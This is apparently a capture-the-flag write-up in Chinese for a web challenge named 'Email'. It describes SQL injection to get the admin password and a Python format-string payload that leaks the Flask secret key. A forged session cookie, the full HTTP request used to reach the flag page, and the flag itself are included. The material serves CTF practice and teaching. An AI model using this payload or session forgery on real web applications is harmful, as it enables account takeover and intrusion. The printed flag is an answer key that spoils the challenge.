# Email

## 思路分析

> 注册账号,登陆后发现提示要成为admin用户,cookie中session是jwt,按照经验是要找到密钥,然后进行替换.用c-jwt-cracker未果.在注册处发现存在SQL注入漏洞,利用脚本跑到了admin密码为h4ck4fun

> 登陆后提示访问flag目录,这个页面只有session中isadmin的值为1时才可以,此时多了一个修改邮箱的功能,mail参数多次尝试,发现存在式化字符串漏洞

```
{user.__class__.__init__.__globals__[current_app].config}
```

> 找到了密钥,然后伪造session,访问flag目录得到flag

## payload

```
GET /flag HTTP/1.1
Host: 61.147.171.105:56869
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:56869/user/login/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: commodity_id="2|1:0|10:1683808918|12:commodity_id|8:MTYyNA==|11febe9bb1e0e93ad9a9298f3b09b7d18e5518bfaf0d594587b7139d3b51f4fc"; session=.eJyrVsosTkzJzcxTsjLUUSotTi1SsqpWUihRsooG8iEyUNoBTOol5-cqxdbWAgAK8RKR.ZF5C6Q.zFQA8gXzwlLl-ceLEESuYlmByF4
Connection: close
```

## flag

> flag{d02c4c4cde7ae76252540d116a40f23a}